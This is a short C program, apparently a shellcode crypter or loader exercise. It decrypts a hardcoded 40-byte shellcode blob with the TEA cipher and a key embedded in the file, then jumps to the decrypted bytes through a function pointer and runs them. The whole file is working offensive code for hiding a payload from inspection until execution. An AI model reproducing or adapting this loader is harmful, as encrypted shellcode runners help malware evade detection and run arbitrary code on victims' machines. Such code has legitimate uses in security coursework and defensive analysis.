#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void decrypt (uint32_t* v, uint32_t* k);
void decryptBlock(uint8_t * data, uint32_t * len, uint32_t * key);

uint32_t TEAKey[4] = {0x68697071, 0x65646172, 0x6d6f635f, 0x6c697665};
uint8_t shellcode[] =  "\x89\x45\x8b\x36\x8a\xc9\x8b\x48\xd6\xb2\x9a\x53\xc8\x59\x18\xd4\x46\x26\x6e\xbf\x33\xdc\x20\x5d\x46\x01\x38\x7c\x4d\x3e\x23\xf1\xa3\xaa\xbf\x73\x46\xdb\xcc\xcd";

int main()
{
	uint32_t* len;
	uint32_t shellcode_len = 0;
	uint32_t counter = 0;
	
	shellcode_len = strlen(shellcode);
	len = &shellcode_len;
	
	decryptBlock(shellcode, len, TEAKey);
	puts("\nDecrypting and running Shellcode:");
	int (*ret)() = (int(*)())shellcode;
	ret();
	
}

void decryptBlock(uint8_t * data, uint32_t * len, uint32_t * key)
{
   uint32_t blocks, i;
   uint32_t * data32;

   // treat the data as 32 bit unsigned integers
   data32 = (uint32_t *) data;

   // Find the number of 8 byte blocks
   blocks = (*len)/8;

   for(i = 0; i< blocks; i++)
   {
      decrypt(&data32[i*2], key);
   }

   // Return the length of the original data
   *len = data32[(blocks*2) - 1];
}


void decrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i<32; i++) {                         /* basic cycle start */
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;                                   
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}
